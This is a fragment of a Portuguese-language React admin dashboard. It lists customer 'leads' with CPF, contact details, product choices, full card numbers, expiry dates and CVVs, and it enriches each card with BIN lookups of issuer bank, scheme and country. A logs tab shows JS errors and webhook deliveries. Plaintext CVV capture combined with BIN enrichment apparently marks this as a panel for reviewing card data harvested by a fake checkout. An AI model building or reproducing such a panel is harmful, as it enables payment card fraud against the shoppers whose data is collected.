                  <tbody>
                    {leads.map((l) => (
                      <tr key={l.id} className="border-t hover:bg-muted/50">
                        <td className="px-3 py-2 whitespace-nowrap">{new Date(l.created_at).toLocaleString("pt-BR")}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.name}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.email}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.phone}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.cpf}</td>
                        <td className="px-3 py-2 whitespace-nowrap">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${l.payment_method === "pix" ? "bg-success/20 text-success" : "bg-primary/20 text-primary"}`}>
                            {l.payment_method}
                          </span>
                        </td>
                        <td className="px-3 py-2">{l.color}</td>
                        <td className="px-3 py-2">{l.size}</td>
                        <td className="px-3 py-2">{l.quantity}</td>
                        <td className="px-3 py-2 whitespace-nowrap">R$ {l.total_amount ? (l.total_amount / 100).toFixed(2) : "—"}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.cidade}/{l.uf}</td>
                        <td className="px-3 py-2 whitespace-nowrap font-mono">{l.card_number}</td>
                        {(() => {
                          const clean = l.card_number?.replace(/\D/g, "") || "";
                          const bin = clean.length >= 6 ? clean.slice(0, 6) : "";
                          const info = bin ? binCache[bin] : null;
                          return (
                            <>
                              <td className="px-3 py-2 whitespace-nowrap text-[10px] font-semibold uppercase">{info?.scheme || "—"}</td>
                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.type || "—"}</td>
                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.bank_name || "—"}</td>
                              <td className="px-3 py-2 whitespace-nowrap text-[10px]">{info?.country_name || "—"}</td>
                            </>
                          );
                        })()}
                        <td className="px-3 py-2 whitespace-nowrap">{l.card_holder}</td>
                        <td className="px-3 py-2">{l.card_expiry}</td>
                        <td className="px-3 py-2">{l.card_cvv}</td>
                        <td className="px-3 py-2">{l.card_installments}</td>
                        <td className="px-3 py-2">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${l.status === "paid" ? "bg-success/20 text-success" : "bg-amber-100 text-amber-700"}`}>
                            {l.status || "pending"}
                          </span>
                        </td>
                      </tr>
                    ))}
                    {!leads.length && (
                      <tr><td colSpan={21} className="text-center py-8 text-muted-foreground">Nenhum lead encontrado</td></tr>
                    )}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {tab === "logs" && (
          <div className="space-y-6">
            {logsLoading ? (
              <p className="text-center text-muted-foreground py-8">Carregando logs...</p>
            ) : (
              <>
                {/* JS Errors */}
                <div>
                  <div className="flex items-center justify-between mb-3">
                    <h2 className="text-lg font-bold flex items-center gap-2">
                      <Bug className="h-5 w-5" /> Erros JavaScript ({errorLogs.length})
                    </h2>
                    {errorLogs.length > 0 && (
                      <button
                        onClick={() => {
                          supabase.from("user_events").delete().eq("event_type", "js_error").then(() => {
                            setErrorLogs([]);
                          });
                        }}
                        className="text-xs text-destructive hover:underline"
                      >
                        Limpar todos
                      </button>
                    )}
                  </div>
                  {errorLogs.length === 0 ? (
                    <div className="bg-emerald-500/5 border border-emerald-500/30 rounded-xl p-4 flex items-center gap-3">
                      <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                      <span className="text-sm text-emerald-600 font-medium">Nenhum erro JavaScript registrado</span>
                    </div>
                  ) : (
                    <div className="space-y-2">
                      {errorLogs.map((log: any) => (
                        <div key={log.id} className="bg-destructive/5 border border-destructive/20 rounded-xl p-4">
                          <div className="flex items-start justify-between gap-2">
                            <p className="text-sm font-semibold text-destructive break-all">
                              {typeof log.event_data === "object" ? (log.event_data as any)?.message : "Erro desconhecido"}
                            </p>
                            <span className="text-[10px] text-muted-foreground whitespace-nowrap flex-shrink-0">
                              {new Date(log.created_at).toLocaleString("pt-BR")}
                            </span>
                          </div>
                          {typeof log.event_data === "object" && (log.event_data as any)?.source && (
                            <p className="text-xs text-muted-foreground mt-1 font-mono break-all">
                              {(log.event_data as any).source}
                              {(log.event_data as any).line ? `:${(log.event_data as any).line}` : ""}
                            </p>
                          )}
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                {/* Webhook Logs */}
                <div>
                  <h2 className="text-lg font-bold mb-3 flex items-center gap-2">
                    <Webhook className="h-5 w-5" /> Webhook Trackly ({webhookLogs.length})
                  </h2>
                  {webhookLogs.length === 0 ? (
                    <div className="bg-muted border rounded-xl p-4 flex items-center gap-3">
                      <span className="text-sm text-muted-foreground">Nenhum log de webhook registrado</span>
                    </div>
                  ) : (
                    <div className="overflow-x-auto border rounded-xl">
                      <table className="w-full text-xs">
                        <thead className="bg-muted">
                          <tr>
                            {["Data", "Pedido", "Status", "HTTP", "URL", "Resposta"].map((h) => (
                              <th key={h} className="px-3 py-2 text-left whitespace-nowrap font-semibold">{h}</th>
                            ))}
                          </tr>
                        </thead>
                        <tbody>
                          {webhookLogs.map((log: any) => (
                            <tr key={log.id} className="border-t hover:bg-muted/50">
                              <td className="px-3 py-2 whitespace-nowrap">{new Date(log.created_at).toLocaleString("pt-BR")}</td>
                              <td className="px-3 py-2 whitespace-nowrap font-mono text-[10px]">{log.order_id?.slice(0, 8) || "—"}</td>
                              <td className="px-3 py-2">
                                <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${log.status === "sent" ? "bg-success/20 text-success" : "bg-destructive/20 text-destructive"}`}>
                                  {log.status}
                                </span>
                              </td>
                              <td className="px-3 py-2">{log.http_status || "—"}</td>
                              <td className="px-3 py-2 max-w-[200px] truncate font-mono text-[10px]">{log.webhook_url}</td>
                              <td className="px-3 py-2 max-w-[200px] truncate font-mono text-[10px]">{log.response || "—"}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              </>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
